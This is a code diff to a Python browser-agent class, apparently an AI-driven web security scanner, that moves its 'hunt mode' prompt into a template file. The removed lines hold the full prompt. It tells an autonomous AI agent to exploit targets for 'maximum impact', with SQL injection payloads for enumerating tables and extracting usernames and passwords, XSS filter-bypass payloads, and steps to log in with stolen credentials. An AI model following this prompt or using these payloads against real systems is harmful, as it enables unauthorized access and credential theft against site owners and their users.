@@ -450,83 +450,40 @@ class BrowserUseReplayer:
             logger.debug(f"  Recon data injection skipped: {e}")
         return prompt
 
+    # Cache for hunt prompt template
+    _hunt_prompt_cache: str = None
+
+    @classmethod
+    def _load_hunt_prompt(cls) -> str:
+        """Load hunt prompt template from src/prompts/hunt.md."""
+        if cls._hunt_prompt_cache is not None:
+            return cls._hunt_prompt_cache
+
+        prompt_path = Path(__file__).parent.parent / "prompts" / "hunt.md"
+        try:
+            cls._hunt_prompt_cache = prompt_path.read_text()
+        except FileNotFoundError:
+            logger.error(f"❌ Hunt prompt not found: {prompt_path}")
+            cls._hunt_prompt_cache = "You are a security scanner. Find and exploit vulnerabilities on {target_url}. Types: {vuln_types}\n{stop_instruction}"
+        return cls._hunt_prompt_cache
+
     def _build_hunt_prompt(self, target_url: str, vuln_types: list[str], stop_on_find: bool = False) -> str:
-        """Build task prompt for autonomous hunt mode."""
+        """Build task prompt for autonomous hunt mode from src/prompts/hunt.md template."""
         types = "\n".join(f"- {vt}" for vt in vuln_types)
         stop_instruction = (
-            "\n\nIMPORTANT: Once you have achieved MAXIMUM IMPACT (extracted credentials, "
+            "IMPORTANT: Once you have achieved MAXIMUM IMPACT (extracted credentials, "
             "logged in as admin, or fully demonstrated the vulnerability's worst-case scenario), "
             "call report_vulnerability ONCE with all evidence, then call done() immediately.\n"
-            "DO NOT call report_vulnerability multiple times for the same vulnerability.\n"
+            "DO NOT call report_vulnerability multiple times for the same vulnerability."
             if stop_on_find else
-            "\n\nBe systematic. Map the app first, then test. Report ALL findings.\n"
-            "Call report_vulnerability ONCE per distinct vulnerability — not multiple times for the same one.\n"
+            "Be systematic. Map the app first, then test. Report ALL findings.\n"
+            "Call report_vulnerability ONCE per distinct vulnerability — not multiple times for the same one."
         )
-        return (
-            "You are an autonomous security exploitation agent. Your job is NOT just to detect "
-            "vulnerabilities — you must achieve MAXIMUM IMPACT. Finding a vulnerability is step 1. "
-            "Extracting sensitive data, stealing credentials, and gaining unauthorized access is the goal.\n\n"
-            f"## Target\n{target_url}\n\n"
-            f"## Vulnerability Types to Look For\n{types}\n\n"
-            "## Exploitation Instructions\n\n"
-            "### Phase 1: Reconnaissance\n"
-            "- Navigate the target, map all pages, forms, parameters, and endpoints\n"
-            "- Identify input vectors (URL params, form fields, headers, cookies)\n"
-            "- Look for login pages, admin panels, user management features\n\n"
-            "### Phase 2: Detection\n"
-            "- Test each input with initial probes to confirm vulnerability exists\n"
-            "- Look for error messages, behavioral changes, or anomalous responses\n\n"
-            "### Phase 3: FULL EXPLOITATION (critical — do not skip any step)\n"
-            "Once you confirm a vulnerability exists, you MUST go ALL THE WAY to maximum impact.\n"
-            "DO NOT stop at just confirming the vulnerability exists. DO NOT stop at just extracting "
-            "the database version. Keep going until you have extracted real sensitive data.\n\n"
-            "**SQL Injection — Full Kill Chain:**\n"
-            "  1. Confirm injection with a tautology (e.g. `' OR 1=1--`)\n"
-            "  2. Determine column count: `' ORDER BY 1--`, `' ORDER BY 2--`, etc. until error\n"
-            "  3. Find displayable columns: `' UNION SELECT NULL,NULL,...--`, replace NULLs with `'abc'`\n"
-            "  4. Identify the database type from version:\n"
-            "     - `' UNION SELECT version(),NULL--` (PostgreSQL/MySQL)\n"
-            "     - `' UNION SELECT banner,NULL FROM v$version--` (Oracle, needs `FROM dual` for simple)\n"
-            "     - `' UNION SELECT @@version,NULL--` (MSSQL)\n"
-            "  5. **Enumerate tables** (DO NOT SKIP):\n"
-            "     - PostgreSQL/MySQL: `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--`\n"
-            "     - If too many results, filter: `...WHERE table_name LIKE '%user%'--` or `LIKE '%login%'` or `LIKE '%account%'`\n"
-            "     - Oracle: `' UNION SELECT table_name,NULL FROM all_tables--`\n"
-            "  6. **Find the users/credentials table** — look for tables named `users`, `accounts`, `credentials`, `members`, `login`, etc.\n"
-            "  7. **Enumerate columns** of the users table (DO NOT SKIP):\n"
-            "     - `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--`\n"
-            "  8. **Extract credentials** (DO NOT SKIP — this is the goal):\n"
-            "     - `' UNION SELECT username,password FROM TABLE_NAME_HERE--`\n"
-            "     - If both columns are strings and you have 2 displayable columns, extract both at once\n"
-            "     - If only 1 displayable column, concatenate: `' UNION SELECT username||':'||password,NULL FROM TABLE_NAME_HERE--` (PostgreSQL/Oracle)\n"
-            "     - MySQL concat: `' UNION SELECT CONCAT(username,':',password),NULL FROM TABLE_NAME_HERE--`\n"
-            "  9. **Log in with stolen credentials** (DO NOT SKIP if login page exists):\n"
-            "     - Find the login page\n"
-            "     - Use the administrator/admin credentials you extracted\n"
-            "     - Prove you have access by navigating to admin panels or protected pages\n"
-            "  10. For Oracle: use `FROM dual` for queries without a real table, `||` for concat\n"
-            "  11. For NULL type mismatches: try `TO_CHAR()` or cast as needed\n\n"
-            "**XSS (Cross-Site Scripting):**\n"
-            "  1. Confirm reflection/injection point\n"
-            "  2. Escalate to actual script execution: get `alert()`, `print()`, or similar to fire\n"
-            "  3. If basic `<script>alert(1)</script>` is blocked, try event handlers: "
-            "`<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `\"><script>alert(1)</script>`\n"
-            "  4. Try encoding bypasses if WAF blocks: HTML entities, URL encoding, case mixing\n\n"
-            "**IDOR / Access Control:**\n"
-            "  1. Confirm you can access another user's resource\n"
-            "  2. Actually retrieve sensitive data (not just a 200 status code)\n"
-            "  3. Demonstrate the full impact — show what data was leaked\n\n"
-            "**Auth Bypass:**\n"
-            "  1. Access protected functionality (admin panel, other user's account)\n"
-            "  2. Perform an action that proves access (view data, modify settings)\n\n"
-            "### Phase 4: Report (ONE report only)\n"
-            "- Only call report_vulnerability ONCE after achieving maximum impact\n"
-            "- Include: the full exploit chain, all extracted data (credentials, version, tables), "
-            "and whether you successfully logged in\n"
-            "- DO NOT report multiple times for the same vulnerability — consolidate everything into ONE report\n"
-            "- A report that stops at 'extracted database version' is INCOMPLETE if there are tables with "
-            "credentials you haven't extracted yet\n"
-            + stop_instruction
+        template = self._load_hunt_prompt()
+        return template.format(
+            target_url=target_url,
+            vuln_types=types,
+            stop_instruction=stop_instruction,
         )
 
     # ── Auth Helpers ─────────────────────────────────────────────────
